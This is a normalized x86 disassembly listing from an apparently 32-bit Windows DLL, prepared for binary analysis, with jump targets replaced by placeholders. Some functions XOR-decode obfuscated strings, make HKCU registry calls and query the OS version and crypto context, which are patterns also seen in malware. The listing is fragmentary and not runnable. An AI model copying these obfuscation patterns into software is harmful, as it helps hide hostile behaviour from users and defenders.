mov eax [ esi + 0x6c ]
push ebx
push edi
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_10039b60
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
mov edx 0x8
cmp [ esi + 0x70 ] edx
jb r-xdata
cmp [ esi + 0x54 ] 0x8
lea eax [ esi + 0x40 ]
jb r-xdata
lea ecx [ esi + 0x5c ]
mov ecx [ esi + 0x5c ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc8 ]
call eax
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x0
push ecx
mov ecx [ esi + 0xc8 ]
push 0x3
push eax
call ecx
mov eax [ eax ]
cmp [ esi + 0x54 ] edx
lea eax [ esi + 0x40 ]
jb r-xdata
mov ecx eax
mov [ esi + 0xc0 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x2 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push 0x4000000
push 0x3
push 0x0
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xc4 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ esi + 0x6c ]
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_10039b60
test eax eax
je r-xdata
mov ecx [ esi + 0xc0 ]
mov edx [ esi + 0xd8 ]
push ecx
call edx
mov [ esi + 0xc0 ] edi
pop edi
pop ebx
mov eax 0x3
pop esi
retn
pop edi
pop ebx
xor eax eax
pop esi
retn
mov eax [ esi + 0x88 ]
lea ebx [ esi + 0x78 ]
push r--data
mov ecx ebx
call sub_10039b60
test eax eax
je r-xdata
mov eax [ esi + 0xa4 ]
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_10039b60
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0x88 ]
jb r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0xa4 ]
jb r-xdata
mov ecx [ esi + 0xcc ]
push eax
mov eax [ esi + 0xc4 ]
push ebx
push 0x2b
push eax
call ecx
test eax eax
jne r-xdata
mov ebx [ ebx ]
mov edx [ esi + 0xc4 ]
push eax
mov eax [ esi + 0xcc ]
push ebx
push 0x2c
push edx
call eax
test eax eax
jne r-xdata
mov ebx [ ebx ]
pop edi
pop ebx
mov eax 0x4
pop esi
retn
pop edi
pop ebx
mov eax 0x5
pop esi
retn
sub_1003ef7a
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004159d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1003f020
push ebp
mov ebp esp
sub esp 0x948
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x948 ] eax
mov esi edx
mov [ ebp - 0x940 ] ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x8
call sub_1002ece0
lea edx [ ebp - 0x58 ]
mov eax 0x4
call sub_1002ece0
push 0x1
mov ecx edx
push 0x0
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10016580
add esp 0x8
test eax eax
je r-xdata
push ebx
push edi
lea edx [ ebp - 0x944 ]
mov eax 0x6
call sub_1002ece0
lea edx [ ebp - 0x93c ]
mov eax 0x2
call sub_1002ece0
lea edx [ ebp - 0x938 ]
xor eax eax
call sub_1002ece0
mov edi [ StrStrW@IAT ]
mov eax edx
push eax
push esi
call edi
lea ecx [ ebp - 0x72c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x93c ]
xor edi edi
sub ebx ecx
nop
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x938 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x6 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x3 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x940 ]
lea ecx [ ebp - 0x938 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x940 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x940 ]
lea edx [ ebp - 0x938 ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x944 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0x93c ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x938 ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0x3
call sub_1002ece0
push 0x3
push edx
lea ecx [ ebp - 0x72c ]
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10016580
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x7
call sub_1002ece0
lea edx [ ebp - 0x78 ]
mov eax 0x9
call sub_1002ece0
mov eax edx
push eax
lea ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x934 ]
call sub_10041b00
mov ecx [ ebp - 0x948 ]
push 0x1
push 0x0
mov eax ebx
mov edx 0x80000001
call sub_10016580
add esp 0x14
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xe
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24 ]
mov eax 0x1
call sub_1002ece0
lea edx [ ebp - 0x98 ]
mov eax 0x5
call sub_1002ece0
mov eax edx
push 0x1
push eax
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x934 ]
mov edx 0x80000001
call sub_10016580
add esp 0x8
neg eax
pop edi
sbb eax eax
pop ebx
and eax 0x10
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xf
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003f479
push 0x4
mov eax sub_1007fd97
call sub_100097c8
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_10054403
mov eax esi
call sub_1004db01
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_10004f2c
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_10054403
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_1003f510
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_1003f5e0
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_1003f5e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_10079a10
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_1003f620
push ebp
mov ebp esp
push 0xffffffff
push sub_10080930
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp sub_1003f690
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_100399e0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1003f690
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_1002c5ed
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1003f6ed
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1000bd19
test edi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003f690
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1003f7a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0xffffffff
mov esi ecx
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_100417c0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003f7d0
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0xd1
call sub_100050e0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_10030ad6
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_10079a10
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x1c ]
push 0x2e
push esi
call sub_10030ad6
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0xec
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_100796a0
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x68
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x20 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_10030ad6
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003f960
push ebp
mov ebp esp
sub esp 0x1d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ rw-data ]
push 0x11c
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
mov [ ebp - 0x1d8 ] edi
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x1d0 ]
push ecx
mov [ ebp - 0x1d0 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1cc ] 0x5
push ebx
mov ebx [ StrStrIW@IAT ]
push esi
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
xor eax eax
mov edi edi
cmp [ ebp - 0x1c8 ] 0x1
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff4
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
lea edx [ ebp - 0x54 ]
mov eax 0x26
call sub_10015360
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffca
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
lea esp [ esp ]
lea edx [ ebp - 0x78 ]
mov eax 0x3
call sub_10015360
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb5
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0x11
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x92 ] ax
nop
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x52
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2c ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x58
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0xe ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0x90 ] dx
inc eax
cmp eax 0xb
jb r-xdata
nop
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x7a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffee
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x56 ] ax
lea esp [ esp ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x6d
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x3a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
call sub_10021f20
test eax eax
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
xor eax eax
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ CryptAcquireContextW@IAT ]
mov ebx [ GetLastError@IAT ]
mov edi edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0xb4 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp - 0x1d8 ]
add esi 0x1c
cmp esi [ edx + 0xda4 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x0
push 0x1
push r--data
push 0x0
lea eax [ ebp - 0x1d4 ]
push eax
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x48 ]
push edx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x90 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1d4 ]
push 0x0
push ecx
call [ CryptReleaseContext@IAT ]
call ebx
cmp eax 0x80090016
jne r-xdata
sub_1003fdd0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
lea ebx [ ebx ]
pop edi
mov eax esi
pop esi
pop ebp
retn
inc esi
cmp esi 0x96
jl r-xdata
mov eax [ esi * 4 + rw-data ]
push eax
push edi
call sub_100239df
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax 0x95
pop esi
pop ebp
retn
sub_1003fe0d
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_100051e8
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_1004018c
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_100051e8
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10051187
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_10060ba3
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_10020659
add esp 0x18
jmp r-xdata
call sub_1000a584
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001c0c1
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
